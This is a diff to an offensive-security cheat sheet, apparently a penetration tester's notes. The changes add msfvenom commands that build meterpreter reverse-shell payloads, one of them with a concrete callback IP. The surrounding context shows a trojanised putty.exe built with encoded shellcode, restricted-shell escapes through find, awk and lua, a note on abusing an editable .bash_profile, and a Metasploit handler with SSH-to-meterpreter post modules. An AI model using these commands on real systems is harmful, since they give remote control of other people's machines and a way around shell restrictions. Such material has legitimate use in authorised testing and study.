@@ -45,6 +45,10 @@ find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 -----
 echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
 -----
+ == Files Executed in Unrestricted Mode? ==
+----- 
+ Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
+-----
 
 
 *OTHERS*
@@ -74,12 +78,18 @@ lua: `os.execute('/bin/sh')`
             == Binaries ==
  Linux
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.139 LPORT=8443 -f elf-so > shell.so
     
  Windows
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
  
  msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe
 
+ *Linux Based Shellcode* - generic
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+
+*Windows Based Shellcode* - generic
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
  
            == Web payloads ==
   
@@ -109,7 +119,8 @@ Perl
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 
           == HANDLERS ==
-    
+ Setup metasploit to receive shells easily.
+ 
 use exploit/multi/handler
 set PAYLOAD <Payload name>
 set LHOST <LHOST value>
@@ -125,6 +136,12 @@ set LPORT 4343
 LPORT => 4343
 msetg SHELL cmd.exe
 exploit -j -z
+
+-----
+SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/
+
+         use auxiliary/scanner/ssh/ssh_login
+         use post/multi/manage/shell_to_meterpreter
 
 
 *REVERSE SHELLS*  
